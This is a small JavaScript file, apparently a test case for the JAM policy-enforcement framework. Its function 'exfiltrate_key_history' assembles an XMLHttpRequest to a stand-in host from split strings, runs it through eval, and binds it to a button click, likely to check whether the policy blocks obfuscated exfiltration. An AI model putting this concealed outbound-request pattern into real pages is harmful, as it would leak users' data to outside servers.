function exfiltrate_key_history() {
  var a = "xmlhttp=new XMLHt";
  var b = "tpRequest();";
  var c = "xmlhttp.op";
  var d = 'en("GET", "http://AnalyticsInc:8000/submission.html?test=concat", true);';
  var e$$4 = "xmlhttp.se";
  var f = "nd(null);";
  var v0 = a + b + c + d + e$$4 + f;
  if(JAM.isEval(eval)) {
    eval("introspect(JAM.policy.pFull) { " + v0 + " }")
  }else {
    JAM.call(eval, null, [v0])
  }
  return
}
JAM.set(JAM.call(JAM.get(document, "getElementById", JAM.policy.p5), document, ["test"], JAM.policy.p5), "onclick", exfiltrate_key_history, JAM.policy.p3);

